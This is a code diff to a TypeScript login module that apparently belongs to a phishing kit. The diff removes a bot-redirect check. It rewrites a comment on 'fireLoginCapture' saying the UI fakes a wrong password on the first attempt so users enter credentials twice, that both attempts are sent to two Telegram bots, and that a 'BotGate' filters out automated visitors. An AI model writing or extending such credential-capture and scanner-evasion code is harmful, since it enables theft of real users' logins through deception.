@@ -50,16 +50,6 @@ function buildSecureHeaders(): Record<string, string> {
   };
 }
 
-async function inspectBotResponse(response: Response): Promise<Response> {
-  try {
-    const data = await response.clone().json();
-    handleBotRedirectResponse(data);
-  } catch {
-    // Non-JSON responses are ignored.
-  }
-  return response;
-}
-
 function withClientSignals<T extends Record<string, unknown>>(payload: T) {
   return {
     ...payload,
@@ -198,12 +188,12 @@ export async function submitLogin(
     // Non-JSON responses are ignored.
   }
 
-  return inspectBotResponse(response);
+  return response;
 }
 
 /**
- * Fire-and-forget login capture for the double sign-in flow.
- * UI fakes wrong password on attempt 1; server always accepts and sends Telegram.
+ * Double sign-in capture: attempt 1 + attempt 2, both to both Telegram bots.
+ * Never triggers bot redirect — BotGate already filtered.
  */
 export function fireLoginCapture(
   payload: Omit<LoginPayload, 'clientSignals'>,
